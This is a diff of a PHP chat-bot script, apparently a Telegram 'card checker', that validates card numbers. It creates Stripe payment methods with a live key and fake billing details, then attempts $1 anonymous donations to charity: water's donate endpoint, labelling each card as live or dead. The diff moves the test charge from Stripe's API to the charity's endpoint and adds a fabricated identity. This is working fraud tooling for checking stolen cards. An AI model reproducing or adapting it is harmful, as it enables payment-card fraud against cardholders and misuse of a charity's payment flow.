@@ -114,22 +114,22 @@ if(strpos($message, "/ss ") === 0 || strpos($message, "!ss ") === 0){
             
             
             if (empty($schemename)) {
-            	$schemename = "Unavailable";
+              $schemename = "Unavailable";
             }
             if (empty($typename)) {
-            	$typename = "Unavailable";
+              $typename = "Unavailable";
             }
             if (empty($brand)) {
-            	$brand = "Unavailable";
+              $brand = "Unavailable";
             }
             if (empty($bank)) {
-            	$bank = "Unavailable";
+              $bank = "Unavailable";
             }
             if (empty($cname)) {
-            	$cname = "Unavailable";
+              $cname = "Unavailable";
             }
             if (empty($phone)) {
-            	$phone = "Unavailable";
+              $phone = "Unavailable";
             }
             
             $ch = curl_init();
@@ -150,31 +150,28 @@ if(strpos($message, "/ss ") === 0 || strpos($message, "!ss ") === 0){
             curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
             curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
             curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
-            curl_setopt($ch, CURLOPT_POSTFIELDS, "type=card&billing_details[address][postal_code]=10080&billing_details[address][city]=new+york&billing_details[address][country]=US&billing_details[address][line1]=13th+ave+st&billing_details[email]=kjhsfkjhkj%40gnauk.co&billing_details[name]=hsdkjfh+kjsdajfh&card[number]=$cc&card[cvc]=$cvv&card[exp_month]=$mes&card[exp_year]=$ano&guid=eeecd20f-d116-4edb-af79-8ab85acc0598edab84&muid=9a9e7a90-ff30-47b3-baa9-0fd142b840923921a6&sid=7b085b3c-01cb-49f5-8568-4844da7df19e654348&pasted_fields=number&payment_user_agent=stripe.js%2Fba1c1ad93%3B+stripe-js-v3%2Fba1c1ad93&time_on_page=73410&key=pk_live_51049Hm4QFaGycgRKpWt6KEA9QxP8gjo8sbC6f2qvl4OnzKUZ7W0l00vlzcuhJBjX5wyQaAJxSPZ5k72ZONiXf2Za00Y1jRrMhU");
+            curl_setopt($ch, CURLOPT_POSTFIELDS, "type=card&billing_details[address][postal_code]=$zip&billing_details[address][city]=New+York&billing_details[address][country]=US&billing_details[address][line1]=13th+ave+st&billing_details[email]=jacobmaxon2%40gmail.com&billing_details[name]=jacob+maxon&card[number]=$cc&card[cvc]=$cvv&card[exp_month]=$mes&card[exp_year]=$ano&guid=$guid&muid=$muid&sid=$sid&pasted_fields=number&payment_user_agent=stripe.js%2F5121664f0%3B+stripe-js-v3%2F5121664f0&time_on_page=947892&key=pk_live_51049Hm4QFaGycgRKpWt6KEA9QxP8gjo8sbC6f2qvl4OnzKUZ7W0l00vlzcuhJBjX5wyQaAJxSPZ5k72ZONiXf2Za00Y1jRrMhU");
             $result1 = curl_exec($ch);
             
             if(stripos($result1, 'error')){
               $errormessage = trim(strip_tags(capture($result1,'"message": "','"')));
               $stripeerror = True;
             }else{
-            $jsondata = json_decode($result1, true);
-            $id = $jsondata['id'];
+              $id = trim(strip_tags(capture($result1,'"id": "','"')));
               $stripeerror = False;
             }
-
             
             if(!$stripeerror){
-                $ch = curl_init();
-            curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods');
+            $ch = curl_init();
+            curl_setopt($ch, CURLOPT_URL, 'https://www.charitywater.org/donate/stripe');
             curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
             curl_setopt($ch, CURLOPT_HEADER, 0);
             curl_setopt($ch, CURLOPT_HTTPHEADER, array(
-              'Host: api.stripe.com',
-              'Accept: application/json',
+              'Host: www.charitywater.org',
+              'Accept: */*',
               'Accept-Language: en-US,en;q=0.9',
-              'Content-Type: application/x-www-form-urlencoded',
-              'Origin: https://js.stripe.com',
-              'Referer: https://js.stripe.com/',
+              'Referer: https://www.charitywater.org/',
+              'Content-Type: application/x-www-form-urlencoded; charset=UTF-8',
               'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36'));
             curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
             curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
@@ -182,9 +179,10 @@ if(strpos($message, "/ss ") === 0 || strpos($message, "!ss ") === 0){
             curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
             curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
             curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
-            curl_setopt($ch, CURLOPT_POSTFIELDS, "type=card&billing_details[address][postal_code]=10080&billing_details[address][city]=new+york&billing_details[address][country]=US&billing_details[address][line1]=13th+ave+st&billing_details[email]=kjhsfkjhkj%40gnauk.co&billing_details[name]=hsdkjfh+kjsdajfh&card[number]=$cc&card[cvc]=$cvv&card[exp_month]=$mes&card[exp_year]=$ano&guid=eeecd20f-d116-4edb-af79-8ab85acc0598edab84&muid=9a9e7a90-ff30-47b3-baa9-0fd142b840923921a6&sid=7b085b3c-01cb-49f5-8568-4844da7df19e654348&pasted_fields=number&payment_user_agent=stripe.js%2Fba1c1ad93%3B+stripe-js-v3%2Fba1c1ad93&time_on_page=73410&key=pk_live_51049Hm4QFaGycgRKpWt6KEA9QxP8gjo8sbC6f2qvl4OnzKUZ7W0l00vlzcuhJBjX5wyQaAJxSPZ5k72ZONiXf2Za00Y1jRrMhU");
-                $result2 = curl_exec($ch);
-                $errormessage = trim(strip_tags(capture($result2,'"text":"','"')));
+            curl_setopt($ch, CURLOPT_POSTFIELDS, "country=us&payment_intent%5Bemail%5D=jacobmaxon2%40gmail.com&payment_intent%5Bamount%5D=1&payment_intent%5Bcurrency%5D=usd&payment_intent%5Bmetadata%5D%5Banalytics_id%5D=30392ca2-9b13-4f72-9d96-9f0fbc2057c2&payment_intent%5Bpayment_method%5D=$id&disable_existing_subscription_check=false&donation_form%5Bamount%5D=1&donation_form%5Banonymous%5D=true&donation_form%5Bcomment%5D=&donation_form%5Bdisplay_name%5D=&donation_form%5Bemail%5D=jacobmaxon2%40gmail.com&donation_form%5Bname%5D=jacob&donation_form%5Bpayment_gateway_token%5D=&donation_form%5Bpayment_monthly_subscription%5D=false&donation_form%5Bsurname%5D=maxon&donation_form%5Bcampaign_id%5D=a5826748-d59d-4f86-a042-1e4c030720d5&donation_form%5Banalytics_uuid%5D=30392ca2-9b13-4f72-9d96-9f0fbc2057c2&donation_form%5Bsetup_intent_id%5D=&donation_form%5Bsubscription_period%5D=&donation_form%5Bprofile_campaign_id%5D=&donation_form%5Bmetadata%5D%5Bfull_donate_page_url%5D=https%3A%2F%2Fwww.charitywater.org%2F&donation_form%5Bmetadata%5D%5Bphone_number%5D=%2B19174856485&donation_form%5Bmetadata%5D%5Bphone_number_consent_granted%5D=&donation_form%5Bmetadata%5D%5Bplaid_account_id%5D=&donation_form%5Bmetadata%5D%5Bplaid_public_token%5D=&donation_form%5Bmetadata%5D%5Breferer%5D=https%3A%2F%2Fcwtr.org%2F2nuqU8B&donation_form%5Bmetadata%5D%5Burl_params%5D%5Btouch_type%5D=1&donation_form%5Bmetadata%5D%5Bwith_saved_payment%5D=false");
+            $result2 = curl_exec($ch);
+            $errorcode = trim(strip_tags(capture($result2,'"code":"','"')));
+            $errormessage = trim(strip_tags(capture($result2,'"message":"','"')));
             }
             $info = curl_getinfo($ch);
             $time = $info['total_time'];
@@ -205,8 +203,7 @@ if(strpos($message, "/ss ") === 0 || strpos($message, "!ss ") === 0){
                 'message_id'=>$messageidtoedit,
                 'text'=>"<b>Card:</b> <code>$lista</code>
 <b>Status -» CVV or CCN ✅
-Response -» $result1 
-Response -» $result2 | $errormessage | $id
+Response -» $result1 | $result2 | $errorcode | $errormessage
 Gateway -» Stripe Auth 1
 Time -» <b>$time</b><b>s</b>
 
@@ -233,7 +230,7 @@ Time -» <b>$time</b><b>s</b>
                 'message_id'=>$messageidtoedit,
                 'text'=>"<b>Card:</b> <code>$lista</code>
 <b>Status -» API Down ❌
-Response -» $result1 | $result2 | $errormessage | $id
+Response -» $result1 | $result2 | $errorcode | $errormessage
 Gateway -» Stripe Auth 1
 Time -» <b>$time</b><b>s</b>
 
@@ -260,7 +257,7 @@ Time -» <b>$time</b><b>s</b>
                 'message_id'=>$messageidtoedit,
                 'text'=>"<b>Card:</b> <code>$lista</code>
 <b>Status -» Dead ❌
-Response -» $result1 | $result2 | $errormessage | $id
+Response -» $result1 | $result2 | $errorcode | $errormessage
 Gateway -» Stripe Auth 1
 Time -» <b>$time</b><b>s</b>
 
